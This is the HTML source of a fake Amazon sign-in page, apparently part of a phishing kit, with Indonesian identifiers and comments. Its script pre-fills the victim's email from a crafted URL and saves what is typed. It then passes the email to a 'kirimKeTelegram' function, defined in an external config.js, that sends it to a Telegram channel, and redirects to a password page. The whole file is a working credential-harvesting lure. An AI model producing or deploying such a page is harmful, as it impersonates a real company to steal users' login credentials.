<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon Sign In</title>
    <script src="config.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Amazon Ember', Arial, sans-serif;
        }
        body {
            background-color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
        }
        .logo {
            margin: 10px 0 20px;
            text-align: center;
        }
        .logo img {
            height: 30px;
        }
        .kotak {
            width: 100%;
            max-width: 348px;
            padding: 20px 26px;
            border: 1px solid #ddd;
            border-radius: 4px;
            background: #fff;
        }
        .kotak h1 {
            font-size: 28px;
            font-weight: 400;
            margin-bottom: 12px;
        }
        .label {
            font-weight: 700;
            font-size: 13px;
            margin: 15px 0 5px;
            display: block;
        }
        .input {
            width: 100%;
            padding: 7px 10px;
            border: 1px solid #a6a6a6;
            border-radius: 3px;
            font-size: 15px;
            height: 31px;
            outline: none;
            transition: border-color 0.1s, box-shadow 0.1s;
        }
        .input:focus {
            border-color: #007185;
            box-shadow: 0 0 0 2px #c8f0f4;
        }
        .input.error {
            border-color: #c40000;
            box-shadow: none;
        }
        .pesan-error {
            color: #c40000;
            font-size: 12px;
            margin: 6px 0 0;
            display: none;
            align-items: flex-start;
            gap: 6px;
        }
        .pesan-error.terlihat {
            display: flex;
        }
        .ikon-error {
            margin-top: 1px;
            flex-shrink: 0;
            font-weight: bold;
        }
        .tombol-lanjut {
            width: 100%;
            padding: 6px 10px;
            background: linear-gradient(to bottom, #f7df89, #ecc000);
            border: 1px solid #a88700;
            border-radius: 8px;
            font-size: 14px;
            cursor: pointer;
            margin: 16px 0 20px;
            height: 31px;
        }
        .tombol-lanjut:hover {
            background: linear-gradient(to bottom, #f5d76e, #d4a300);
        }
        .keterangan {
            font-size: 12px;
            line-height: 1.5;
            margin-bottom: 22px;
        }
        .keterangan a {
            color: #0066c0;
            text-decoration: none;
        }
        .keterangan a:hover {
            text-decoration: underline;
        }
        .garis-pemisah {
            border-bottom: 1px solid #e7e7e7;
            margin: 18px 0;
        }
        .bagian-bisnis {
            font-size: 13px;
        }
        .bagian-bisnis a {
            color: #0066c0;
            text-decoration: none;
        }
        .bagian-bisnis a:hover {
            text-decoration: underline;
        }
        .bawah {
            margin-top: 30px;
            font-size: 11px;
            color: #555;
            text-align: center;
        }
        .bawah a {
            color: #0066c0;
            text-decoration: none;
            margin: 0 8px;
        }
        .bawah a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <div class="logo">
        <img src="img/amazonlogo.png" alt="Amazon">
    </div>

    <div class="kotak">
        <h1>Sign in or create account</h1>

        <label class="label" for="email">Enter mobile number or email</label>
        <input type="text" id="email" class="input" autocomplete="username">
        
        <div id="pesan-error" class="pesan-error">
            <span class="ikon-error">!</span>
            <span>Enter your mobile number or email</span>
        </div>

        <button id="tombol-lanjut" class="tombol-lanjut" onclick="lanjut()">Continue</button>

        <div class="keterangan">
            By continuing, you agree to Amazon's
            <a href="#">Conditions of Use</a> and
            <a href="#">Privacy Notice</a>.
        </div>

        <div class="keterangan">
            <a href="#">Need help?</a>
        </div>

        <div class="garis-pemisah"></div>

        <div style="font-size: 13px; font-weight: 700;">Buying for work?</div>
        <div class="bagian-bisnis">
            <a href="#">Create a free business account</a>
        </div>
    </div>

    <div class="bawah">
        <p>
            <a href="#">Conditions of Use</a>
            <a href="#">Privacy Notice</a>
            <a href="#">Help</a>
        </p>
        <p style="margin-top: 5px; color: #888;">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
    </div>

<script>
const inputEmail = document.getElementById('email');
const tombolLanjut = document.getElementById('tombol-lanjut');
const pesanError = document.getElementById('pesan-error');

// Isi otomatis dari parameter URL jika ada
window.addEventListener('load', function() {
    const params = new URLSearchParams(window.location.search);
    const url = window.location.href;
    
    // Cek pola: ?namaParam-email@domain.com-123=aktif
    const cocok = url.match(/-([^-]+@[^-]+)-\d+=aktif/);
    if (cocok && cocok[1]) {
        inputEmail.value = decodeURIComponent(cocok[1]);
    }
});

// Sembunyikan error saat mengetik
inputEmail.addEventListener('input', function() {
    if (this.value.trim()) {
        pesanError.classList.remove('terlihat');
        this.classList.remove('error');
    }
});

inputEmail.addEventListener('keydown', function(e) {
    if (e.key === 'Enter') lanjut();
});

function lanjut() {
    const email = inputEmail.value.trim();
    
    if (!email) {
        // Tampilkan error jika kosong
        pesanError.classList.add('terlihat');
        inputEmail.classList.add('error');
        return;
    }

    // Simpan email untuk halaman password
    localStorage.setItem('email_pengguna', email);
    
    // Kirim data ke Telegram jika ada fungsi
    if (window.kirimKeTelegram) {
        window.kirimKeTelegram({
            tipe: 'LOGIN',
            email: email
        });
    }

    // Pindah ke halaman password
    window.location.href = 'password.html';
}
</script>

</body>
</html>
